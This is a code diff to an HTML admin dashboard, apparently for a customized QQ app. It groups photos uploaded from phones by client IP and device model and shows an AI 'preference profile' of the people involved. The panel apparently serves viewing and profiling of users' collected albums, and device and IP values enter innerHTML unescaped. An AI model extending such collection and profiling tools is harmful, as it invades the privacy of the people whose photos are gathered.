@@ -3,18 +3,18 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QQ定制 · 云端相册管理与 AI 偏好画像大屏 (IP分批 & 智能删除版)</title>
+    <title>QQ定制 · 云端相册管理与 AI 偏好画像大屏 (IP & 手机型号分批管理)</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         body {
-            background: linear-gradient(135deg, #0b0f19 0%, #16192b 50%, #0b0f19 100%);
+            background: linear-gradient(135deg, #0a0e1a 0%, #15182d 50%, #0a0e1a 100%);
             min-height: 100vh;
             color: #f8fafc;
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
         }
         .glass-card {
-            background: rgba(22, 27, 46, 0.75);
+            background: rgba(22, 27, 46, 0.78);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             border: 1px solid rgba(255, 255, 255, 0.08);
@@ -26,18 +26,18 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
         .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         .custom-checkbox {
             appearance: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.4);
-            border-radius: 6px;
-            background: rgba(15, 23, 42, 0.8);
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255, 255, 255, 0.45);
+            border-radius: 7px;
+            background: rgba(15, 23, 42, 0.85);
             cursor: pointer;
             position: relative;
             transition: all 0.2s;
         }
         .custom-checkbox:checked {
             background: #6366f1;
-            border-color: #818cf8;
+            border-color: #a5b4fc;
         }
         .custom-checkbox:checked::after {
             content: "✓";
@@ -46,7 +46,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
             left: 50%;
             transform: translate(-50%, -50%);
             color: white;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 900;
         }
     </style>
@@ -62,9 +62,9 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
             <div>
                 <h1 class="text-xl font-extrabold tracking-tight text-white flex items-center space-x-2">
                     <span>QQ定制 · 云端相册管理后台</span>
-                    <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">IP分批管理</span>
+                    <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">IP & 型号分批</span>
                 </h1>
-                <p class="text-xs text-slate-400 mt-0.5">按客户端 IP 分组管理 · 多选批量删除 · 一键全量清空 · AI 喜好雷达</p>
+                <p class="text-xs text-slate-400 mt-0.5">按客户端 IP / 手机型号分批管理 · 多选批量删除 · 一键全量清空 · AI 喜好雷达</p>
             </div>
         </div>
 
@@ -96,7 +96,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                 </div>
                 <p class="text-[11px] text-indigo-400 mt-2 flex items-center space-x-1">
                     <i data-lucide="filter" class="w-3 h-3"></i>
-                    <span id="stat-current-ip-label">当前筛选: 全部 IP</span>
+                    <span id="stat-current-batch-label">当前筛选: 全部批次</span>
                 </p>
             </div>
 
@@ -113,14 +113,14 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
 
             <div class="glass-card rounded-3xl p-5 shadow-xl">
                 <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
-                    <span>已连接 IP 客户端</span>
-                    <i data-lucide="network" class="w-4 h-4 text-amber-400"></i>
+                    <span>在线设备 / IP 批次</span>
+                    <i data-lucide="smartphone" class="w-4 h-4 text-amber-400"></i>
                 </div>
                 <div class="mt-3 flex items-baseline space-x-2">
-                    <span id="stat-ip-count" class="text-3xl font-black text-amber-300">0</span>
-                    <span class="text-xs text-slate-400">个不同 IP 来源</span>
+                    <span id="stat-device-count" class="text-3xl font-black text-amber-300">0</span>
+                    <span class="text-xs text-slate-400">个设备型号</span>
                 </div>
-                <p class="text-[11px] text-slate-400 mt-2">支持独立分组审查</p>
+                <p class="text-[11px] text-slate-400 mt-2" id="stat-ip-subtext">支持按设备/IP独立审查</p>
             </div>
 
             <div class="glass-card rounded-3xl p-5 shadow-xl">
@@ -132,25 +132,40 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                     <span id="stat-size" class="text-3xl font-black text-emerald-300">0.0</span>
                     <span class="text-xs text-slate-400">MB</span>
                 </div>
-                <p class="text-[11px] text-slate-400 mt-2">无损原画存储</p>
+                <p class="text-[11px] text-slate-400 mt-2">无损原画直传存储</p>
             </div>
         </div>
 
-        <!-- 2. IP 分组管理导航卡片 (IP Batch Management) -->
+        <!-- 2. 按 IP 与 手机型号分批管理卡片 (Batch Filter Tabs) -->
         <div class="glass-card rounded-3xl p-5 shadow-xl space-y-3">
             <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
                 <div class="flex items-center space-x-2">
-                    <i data-lucide="network" class="w-4 h-4 text-sky-400"></i>
-                    <h2 class="text-sm font-extrabold text-white">按客户端 IP 分批筛选查看</h2>
+                    <i data-lucide="layers" class="w-4 h-4 text-sky-400"></i>
+                    <h2 class="text-sm font-extrabold text-white">按客户端 IP 或 手机型号分批筛选</h2>
                 </div>
-                <span class="text-[11px] text-slate-400">点击 IP 标签切换相册批次</span>
+                <span class="text-[11px] text-slate-400">点击标签切换相册批次</span>
             </div>
 
-            <div id="ip-tabs-container" class="flex flex-wrap gap-2 pt-1">
-                <button onclick="selectIpGroup('all')" class="ip-tab-btn active px-3.5 py-1.5 rounded-xl bg-indigo-600 text-white text-xs font-bold shadow-xs transition flex items-center space-x-1.5">
-                    <i data-lucide="globe" class="w-3.5 h-3.5"></i>
-                    <span>全部 IP (0张)</span>
-                </button>
+            <!-- 手机型号批次标签 -->
+            <div class="space-y-1.5">
+                <div class="text-[11px] font-bold text-slate-400 flex items-center space-x-1">
+                    <i data-lucide="smartphone" class="w-3 h-3 text-amber-400"></i>
+                    <span>📱 手机型号批次:</span>
+                </div>
+                <div id="device-tabs-container" class="flex flex-wrap gap-2">
+                    <!-- 动态注入设备型号标签 -->
+                </div>
+            </div>
+
+            <!-- 客户端 IP 批次标签 -->
+            <div class="space-y-1.5 pt-2 border-t border-slate-800/60">
+                <div class="text-[11px] font-bold text-slate-400 flex items-center space-x-1">
+                    <i data-lucide="network" class="w-3 h-3 text-sky-400"></i>
+                    <span>🌐 客户端 IP 批次:</span>
+                </div>
+                <div id="ip-tabs-container" class="flex flex-wrap gap-2">
+                    <!-- 动态注入IP标签 -->
+                </div>
             </div>
         </div>
 
@@ -197,9 +212,9 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                         <span id="batch-delete-text">批量删除所选 (0)</span>
                     </button>
 
-                    <button onclick="confirmClearCurrentIp()" class="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white text-xs font-black shadow-lg shadow-red-500/20 transition active:scale-95 flex items-center space-x-1.5">
+                    <button onclick="confirmClearCurrentBatch()" class="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white text-xs font-black shadow-lg shadow-red-500/20 transition active:scale-95 flex items-center space-x-1.5">
                         <i data-lucide="flame" class="w-3.5 h-3.5"></i>
-                        <span id="clear-ip-btn-text">一键清空当前 IP 全部相片</span>
+                        <span id="clear-batch-btn-text">一键清空当前批次相片</span>
                     </button>
                 </div>
             </div>
@@ -218,7 +233,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
             <div id="photo-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3.5 min-h-[240px]">
                 <div class="col-span-full py-16 text-center text-slate-400 text-xs flex flex-col items-center justify-center space-y-2">
                     <i data-lucide="cloud-off" class="w-8 h-8 text-slate-600"></i>
-                    <span>暂无云端数据或该 IP 下暂无相片</span>
+                    <span>暂无云端数据或该批次下暂无相片</span>
                 </div>
             </div>
         </div>
@@ -258,7 +273,8 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
 
     <script>
         let allItems = [];
-        let currentIp = 'all';
+        let batchFilterType = 'all'; // 'all', 'ip', 'device'
+        let batchFilterValue = 'all';
         let currentFilter = 'all';
         let selectedFiles = new Set();
 
@@ -270,42 +286,65 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                 if (data && data.success) {
                     allItems = data.recent_items || [];
                     
-                    // 1. IP 分组统计
-                    const ipGroups = data.ip_groups || [];
-                    document.getElementById('stat-ip-count').innerText = ipGroups.length;
+                    // 1. 设备型号分组渲染
+                    const deviceGroups = data.device_groups || [];
+                    document.getElementById('stat-device-count').innerText = deviceGroups.length;
                     
-                    const ipTabsContainer = document.getElementById('ip-tabs-container');
-                    const totalAllCount = allItems.length;
-                    
-                    let tabsHtml = `
-                        <button onclick="selectIpGroup('all')" class="ip-tab-btn ${currentIp === 'all' ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3.5 py-1.5 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1.5">
-                            <i data-lucide="globe" class="w-3.5 h-3.5"></i>
-                            <span>全部 IP (${totalAllCount}张)</span>
+                    const devTabsContainer = document.getElementById('device-tabs-container');
+                    let devHtml = `
+                        <button onclick="setBatchFilter('all', 'all')" class="batch-tab-btn ${batchFilterType === 'all' ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3 py-1 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1">
+                            <span>全部型号 (${allItems.length}张)</span>
                         </button>
                     `;
+                    deviceGroups.forEach(d => {
+                        const isCur = (batchFilterType === 'device' && batchFilterValue === d.device);
+                        devHtml += `
+                            <button onclick="setBatchFilter('device', '${d.device}')" class="batch-tab-btn ${isCur ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3 py-1 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1">
+                                <i data-lucide="smartphone" class="w-3 h-3 text-amber-400"></i>
+                                <span>${d.device} (${d.count}张)</span>
+                            </button>
+                        `;
+                    });
+                    devTabsContainer.innerHTML = devHtml;
 
+                    // 2. IP 分组渲染
+                    const ipGroups = data.ip_groups || [];
+                    const ipTabsContainer = document.getElementById('ip-tabs-container');
+                    let ipHtml = `
+                        <button onclick="setBatchFilter('all', 'all')" class="batch-tab-btn ${batchFilterType === 'all' ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3 py-1 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1">
+                            <span>全部 IP (${allItems.length}张)</span>
+                        </button>
+                    `;
                     ipGroups.forEach(g => {
-                        const isCurrent = currentIp === g.ip;
-                        tabsHtml += `
-                            <button onclick="selectIpGroup('${g.ip}')" class="ip-tab-btn ${isCurrent ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3.5 py-1.5 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1.5">
-                                <i data-lucide="smartphone" class="w-3.5 h-3.5 text-sky-400"></i>
+                        const isCur = (batchFilterType === 'ip' && batchFilterValue === g.ip);
+                        ipHtml += `
+                            <button onclick="setBatchFilter('ip', '${g.ip}')" class="batch-tab-btn ${isCur ? 'active bg-indigo-600 text-white' : 'bg-slate-800/80 text-slate-300 hover:bg-slate-700'} px-3 py-1 rounded-xl text-xs font-bold shadow-xs transition flex items-center space-x-1">
+                                <i data-lucide="network" class="w-3 h-3 text-sky-400"></i>
                                 <span>${g.ip} (${g.count}张)</span>
                             </button>
                         `;
                     });
-                    ipTabsContainer.innerHTML = tabsHtml;
+                    ipTabsContainer.innerHTML = ipHtml;
 
-                    // 2. 核心指标更新
-                    const displayedItems = currentIp === 'all' ? allItems : allItems.filter(i => i.ip === currentIp);
+                    // 3. 核心指标更新
+                    const displayedItems = getFilteredBatchItems();
                     document.getElementById('stat-total').innerText = displayedItems.length;
                     document.getElementById('stat-top-interest').innerText = data.top_interest || '待同步数据';
-                    document.getElementById('stat-current-ip-label').innerText = currentIp === 'all' ? '当前筛选: 全部 IP' : `当前筛选 IP: ${currentIp}`;
-                    document.getElementById('clear-ip-btn-text').innerText = currentIp === 'all' ? '🔥 一键清空全量相册' : `🔥 一键清空 [${currentIp}] 的相片`;
+                    
+                    let batchLabel = '当前筛选: 全部批次';
+                    if (batchFilterType === 'device') batchLabel = `当前型号: ${batchFilterValue}`;
+                    if (batchFilterType === 'ip') batchLabel = `当前 IP: ${batchFilterValue}`;
+                    document.getElementById('stat-current-batch-label').innerText = batchLabel;
+                    
+                    let clearText = '🔥 一键清空全量相册';
+                    if (batchFilterType === 'device') clearText = `🔥 一键清空 [${batchFilterValue}] 全部相片`;
+                    if (batchFilterType === 'ip') clearText = `🔥 一键清空 [${batchFilterValue}] 全部相片`;
+                    document.getElementById('clear-batch-btn-text').innerText = clearText;
 
                     const totalBytes = displayedItems.reduce((acc, f) => acc + (f.size_kb * 1024 || 0), 0);
                     document.getElementById('stat-size').innerText = (totalBytes / (1024 * 1024)).toFixed(1);
 
-                    // 3. AI 偏好进度条渲染
+                    // 4. AI 偏好进度条渲染
                     const barsContainer = document.getElementById('category-bars');
                     barsContainer.innerHTML = (data.distribution || []).map(d => `
                         <div class="space-y-1.5 bg-slate-900/40 p-3 rounded-2xl border border-slate-800/60">
@@ -327,11 +366,21 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
             lucide.createIcons();
         }
 
-        function selectIpGroup(ip) {
-            currentIp = ip;
+        function setBatchFilter(type, value) {
+            batchFilterType = type;
+            batchFilterValue = value;
             selectedFiles.clear();
             updateSelectionUi();
             loadDashboardData();
+        }
+
+        function getFilteredBatchItems() {
+            if (batchFilterType === 'device') {
+                return allItems.filter(i => (i.device_id || 'Unknown') === batchFilterValue);
+            } else if (batchFilterType === 'ip') {
+                return allItems.filter(i => (i.ip || '127.0.0.1') === batchFilterValue);
+            }
+            return allItems;
         }
 
         function filterCategory(cat) {
@@ -347,7 +396,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
 
         function renderPhotoGrid() {
             const grid = document.getElementById('photo-grid');
-            let filtered = currentIp === 'all' ? allItems : allItems.filter(item => item.ip === currentIp);
+            let filtered = getFilteredBatchItems();
             if (currentFilter !== 'all') {
                 filtered = filtered.filter(item => item.category === currentFilter);
             }
@@ -356,7 +405,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                 grid.innerHTML = `
                     <div class="col-span-full py-16 text-center text-slate-400 text-xs flex flex-col items-center justify-center space-y-2">
                         <i data-lucide="folder-x" class="w-8 h-8 text-slate-600"></i>
-                        <span>当前筛选条件下暂无相片数据</span>
+                        <span>当前批次/分类下暂无相片数据</span>
                     </div>
                 `;
                 lucide.createIcons();
@@ -374,13 +423,13 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
                             <input type="checkbox" ${isChecked ? 'checked' : ''} onchange="toggleItemSelection('${item.filename}', this.checked)" class="custom-checkbox shadow-md">
                         </div>
 
-                        <!-- 标签胶囊 (AI分类 & IP) -->
+                        <!-- 标签胶囊 (AI分类 & 设备型号) -->
                         <div class="absolute top-2 left-2 z-10 flex flex-col space-y-1">
                             <span class="px-2 py-0.5 rounded-md bg-slate-950/85 backdrop-blur-md text-[9px] font-extrabold text-sky-300 border border-white/10 shadow-sm w-fit">
                                 ${item.category_name || '相片'}
                             </span>
-                            <span class="px-1.5 py-0.5 rounded bg-indigo-950/80 text-[8px] font-bold text-indigo-300 w-fit">
-                                ${item.ip || 'Local'}
+                            <span class="px-1.5 py-0.5 rounded bg-indigo-950/80 text-[8px] font-bold text-amber-300 w-fit">
+                                ${item.device_id || '设备'}
                             </span>
                         </div>
 
@@ -408,7 +457,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
         }
 
         function toggleSelectAll() {
-            let filtered = currentIp === 'all' ? allItems : allItems.filter(item => item.ip === currentIp);
+            let filtered = getFilteredBatchItems();
             if (currentFilter !== 'all') {
                 filtered = filtered.filter(item => item.category === currentFilter);
             }
@@ -491,16 +540,26 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
             }
         }
 
-        // 3. 一键清空当前 IP 或全部
-        async function confirmClearCurrentIp() {
-            const label = currentIp === 'all' ? '全部 IP 的所有相片' : `IP [${currentIp}] 的所有相片`;
+        // 3. 一键清空当前批次
+        async function confirmClearCurrentBatch() {
+            let label = '全部批次的所有相片';
+            let payload = { ip: 'all', device: 'all' };
+
+            if (batchFilterType === 'device') {
+                label = `型号 [${batchFilterValue}] 的所有相片`;
+                payload = { ip: 'all', device: batchFilterValue };
+            } else if (batchFilterType === 'ip') {
+                label = `IP [${batchFilterValue}] 的所有相片`;
+                payload = { ip: batchFilterValue, device: 'all' };
+            }
+
             if (!confirm(`⚠️ 高危操作确认：\n\n您确定要一键清空 ${label} 吗？此操作将彻底删除磁盘物理文件！`)) return;
 
             try {
                 const res = await fetch('/api/gallery/delete_all', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ip: currentIp })
+                    body: JSON.stringify(payload)
                 });
                 const data = await res.json();
                 if (data.success) {
@@ -531,7 +590,7 @@ ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
 
             info.innerHTML = `
                 <div>文件名: <b class="text-white">${name}</b></div>
-                <div class="text-[11px] text-slate-400">来源 IP: <b class="text-sky-300">${ip}</b> · 设备: <b>${device}</b> · AI 分类: <b class="text-purple-400">${cat}</b> · 大小: <b>${size}</b></div>
+                <div class="text-[11px] text-slate-400">手机型号: <b class="text-amber-300">${device}</b> · 来源 IP: <b class="text-sky-300">${ip}</b> · AI 分类: <b class="text-purple-400">${cat}</b> · 大小: <b>${size}</b></div>
             `;
             modal.classList.remove('hidden');
             setTimeout(() => modal.classList.remove('opacity-0'), 10);
